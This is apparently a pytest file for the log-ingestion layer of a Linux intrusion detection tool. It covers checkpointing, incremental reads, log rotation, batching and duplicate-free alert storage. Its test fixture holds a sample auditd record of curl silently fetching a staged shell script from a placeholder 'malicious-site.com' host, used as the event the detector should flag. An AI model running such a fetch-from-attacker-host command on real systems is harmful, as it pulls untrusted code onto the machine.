"""
Tests for bounded incremental ingestion: checkpoints, tailing, rotation,
batching, and idempotent restart-safe writes.
"""
import os
import tempfile

import pytest

from collectors.linux.collector import LinuxCollector
from core.correlator import Correlator, load_chain_rules
from core.database import AlertDatabase
from core.engine import DetectionEngine
from core.ingest import (
    Checkpoint,
    CheckpointStore,
    IngestionService,
    chunked,
    linux_auditd_parser,
    read_new_text,
)
from core.rule_loader import RuleLoader

# One complete auditd event group (malicious curl download) as raw lines.
# uid 1000 (not root) so the LNX-001 root whitelist does not suppress it.
CURL_EVENT = (
    'type=SYSCALL msg=audit({ts}:{sid}): arch=c000003e syscall=59 success=yes '
    'exit=0 ppid=1234 pid={pid} auid=1000 uid=1000 gid=1000 euid=1000 tty=pts0 '
    'ses=1 comm="curl" exe="/usr/bin/curl" key=(null)\n'
    'type=EXECVE msg=audit({ts}:{sid}): argc=3 a0="curl" a1="-s" '
    'a2="http://malicious-site.com/{payload}.sh"\n'
    'type=CWD msg=audit({ts}:{sid}): cwd="/home/user"\n'
)


def curl_event(ts, sid, pid):
    # Vary the URL so each event has a distinct fingerprint (pid alone is
    # not part of the dedup fingerprint).
    return CURL_EVENT.format(ts=ts, sid=sid, pid=pid, payload=f"stage{sid}")


@pytest.fixture
def temp_db():
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        path = f.name
    try:
        yield AlertDatabase(path)
    finally:
        os.unlink(path)


@pytest.fixture
def service(temp_db):
    engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
    parser = linux_auditd_parser(LinuxCollector())
    correlator = Correlator(load_chain_rules())
    return IngestionService(
        temp_db, engine, parser, correlator=correlator, batch_size=10
    )


@pytest.fixture
def logfile():
    with tempfile.NamedTemporaryFile(
        suffix=".log", delete=False, mode="w"
    ) as f:
        path = f.name
    try:
        yield path
    finally:
        os.unlink(path)


class TestChunked:
    def test_bounded_batches(self):
        batches = list(chunked(range(25), 10))
        assert [len(b) for b in batches] == [10, 10, 5]

    def test_empty(self):
        assert list(chunked([], 10)) == []

    def test_invalid_size(self):
        with pytest.raises(ValueError):
            list(chunked([1, 2], 0))


class TestReadNewText:
    def test_reads_only_complete_lines(self, logfile):
        with open(logfile, "w") as f:
            f.write("line1\nline2\npartial")
        result = read_new_text(logfile, Checkpoint(source=logfile))
        assert result["text"] == "line1\nline2\n"
        # Offset stops before the partial line
        assert result["new_offset"] == len("line1\nline2\n")

    def test_incremental_reads_from_offset(self, logfile):
        with open(logfile, "w") as f:
            f.write("a\nb\n")
        first = read_new_text(logfile, Checkpoint(source=logfile))
        cp = Checkpoint(
            source=logfile, offset=first["new_offset"],
            inode=first["inode"], size=first["size"],
        )
        with open(logfile, "a") as f:
            f.write("c\n")
        second = read_new_text(logfile, cp)
        assert second["text"] == "c\n"
        assert second["reset"] is False

    def test_truncation_resets(self, logfile):
        with open(logfile, "w") as f:
            f.write("aaaa\nbbbb\n")
        r = read_new_text(logfile, Checkpoint(source=logfile))
        cp = Checkpoint(
            source=logfile, offset=r["new_offset"],
            inode=r["inode"], size=r["size"],
        )
        # Truncate below the recorded offset
        with open(logfile, "w") as f:
            f.write("x\n")
        result = read_new_text(logfile, cp)
        assert result["reset"] is True
        assert result["text"] == "x\n"


class TestCheckpointStore:
    def test_roundtrip(self, temp_db):
        store = CheckpointStore(temp_db)
        assert store.load("src").offset == 0  # fresh
        store.save(Checkpoint(source="src", offset=42, inode=7, size=100, events_ingested=3))
        loaded = store.load("src")
        assert loaded.offset == 42
        assert loaded.inode == 7
        assert loaded.events_ingested == 3

    def test_upsert(self, temp_db):
        store = CheckpointStore(temp_db)
        store.save(Checkpoint(source="src", offset=10))
        store.save(Checkpoint(source="src", offset=20))
        assert store.load("src").offset == 20


class TestIngestionService:
    def test_first_ingest_generates_alerts(self, service, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        summary = service.ingest_file(logfile)
        assert summary["events_processed"] == 1
        assert summary["alerts_new"] == 1
        assert summary["end_offset"] > 0

    def test_second_ingest_only_new_content(self, service, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        service.ingest_file(logfile)

        # Append a second, distinct event
        with open(logfile, "a") as f:
            f.write(curl_event(1642253500.2, 1002, 5679))
        summary = service.ingest_file(logfile)
        assert summary["events_processed"] == 1  # only the new event
        assert summary["alerts_new"] == 1

    def test_reingest_without_new_content_is_noop(self, service, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        service.ingest_file(logfile)
        summary = service.ingest_file(logfile)
        assert summary["events_processed"] == 0
        assert summary["alerts_new"] == 0

    def test_restart_from_checkpoint_is_idempotent(self, temp_db, logfile):
        # A fresh service (simulating a restart) resumes at the stored
        # checkpoint and does not reprocess committed events.
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))

        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())

        svc1 = IngestionService(temp_db, engine, parser, batch_size=10)
        svc1.ingest_file(logfile)

        svc2 = IngestionService(temp_db, engine, parser, batch_size=10)
        summary = svc2.ingest_file(logfile)
        assert summary["events_processed"] == 0
        assert summary["start_offset"] == summary["end_offset"]

    def test_idempotent_writes_on_forced_reprocess(self, temp_db, logfile):
        # Even if the same content is reprocessed from offset 0 (checkpoint
        # lost), fingerprint dedup prevents duplicate alert rows.
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())

        svc = IngestionService(temp_db, engine, parser, batch_size=10)
        svc.ingest_file(logfile)
        first_count = len(temp_db.get_alerts(limit=1000))

        # Wipe the checkpoint to force a full reprocess
        temp_db.connection.execute("DELETE FROM ingest_checkpoints")
        temp_db.connection.commit()
        summary = svc.ingest_file(logfile)
        assert summary["alerts_new"] == 0
        assert summary["alerts_duplicate"] == 1
        assert len(temp_db.get_alerts(limit=1000)) == first_count

    def test_bounded_batches_cover_all_events(self, temp_db, logfile):
        # 25 distinct events with batch_size 10 => 3 batches, all processed.
        with open(logfile, "w") as f:
            for i in range(25):
                f.write(curl_event(1642253400.0 + i, 2000 + i, 6000 + i))
        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())
        svc = IngestionService(temp_db, engine, parser, batch_size=10)
        summary = svc.ingest_file(logfile)
        assert summary["events_processed"] == 25
        assert summary["batches"] == 3
        assert summary["alerts_new"] == 25

    def test_rotation_restarts_and_reprocesses(self, temp_db, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())
        svc = IngestionService(temp_db, engine, parser, batch_size=10)
        svc.ingest_file(logfile)

        # Simulate rotation: replace file content with a smaller new event.
        os.unlink(logfile)
        with open(logfile, "w") as f:
            f.write(curl_event(1642260000.9, 9001, 7000))
        summary = svc.ingest_file(logfile)
        assert summary["reset"] is True
        assert summary["events_processed"] == 1
